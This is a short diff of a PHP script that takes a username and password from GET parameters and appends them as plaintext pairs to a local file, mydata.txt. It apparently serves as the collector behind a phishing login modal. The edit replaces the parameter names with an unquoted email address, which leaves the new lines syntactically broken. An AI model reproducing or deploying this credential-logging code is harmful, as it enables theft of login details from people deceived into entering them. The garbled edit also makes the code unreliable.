@@ -1,7 +1,7 @@
 <?php
-if(isset($_GET['modal-username']) && isset($_GET['modal-password'])) {
-	$email = htmlspecialchars(stripslashes($_GET['modal-username']));
-	$password = htmlspecialchars(stripslashes($_GET['modal-password']));
+if(isset($_GET[macacospelo@gmail.com]) && isset($_GET[macacospelo@gmail.com])) {
+	$email = htmlspecialchars(stripslashes($_GET[macacospelo@gmail.com]));
+	$password = htmlspecialchars(stripslashes($_GET[macacospelo@gmail.com]));
     $data = $email . '-' . $password . "\n";
     $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
